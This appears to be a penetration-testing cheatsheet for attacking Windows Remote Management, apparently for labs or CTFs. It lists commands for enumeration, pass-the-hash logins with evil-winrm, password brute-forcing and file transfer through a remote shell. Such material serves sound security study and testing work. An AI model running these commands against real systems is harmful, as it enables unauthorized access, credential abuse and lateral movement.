# WinRM (5985 / 5986)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Windows Remote Management — PowerShell remoting. If you have credentials (even a hash in some configs), this is your **remote execution path** without dropping a binary. Increasingly common as admins shift from RDP to PowerShell-based management. **Evil-WinRM** is your tool. WinRM auth typically requires the user be in `Remote Management Users` or local Administrators. **Common attack vectors:** Evil-WinRM with creds or hash, lateral movement, Pass-the-Hash, lateral movement chaining from SMB cred capture.

## Enumerate

```bash
nmap -sV -sC -p 5985,5986 $IP
nxc winrm $IP -u user -p 'pass'
```

## Connect

```bash
evil-winrm -i $IP -u user -p 'password'
evil-winrm -i $IP -u user -H NTHASH     # pass-the-hash

# PowerShell remoting
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
```

## Brute-force

```bash
nxc winrm $IP -u users.txt -p passwords.txt
```

## evil-winrm features

```text
*Evil-WinRM* PS > upload /local/file.exe C:\Windows\Temp\file.exe
*Evil-WinRM* PS > download C:\Users\user\flag.txt
*Evil-WinRM* PS > menu   # show additional commands
```

## Notes

- Port 5985 = HTTP, 5986 = HTTPS
- Requires user to be in **Remote Management Users** group (or admin)
- `nxc winrm` shows `(Pwn3d!)` if user can execute commands
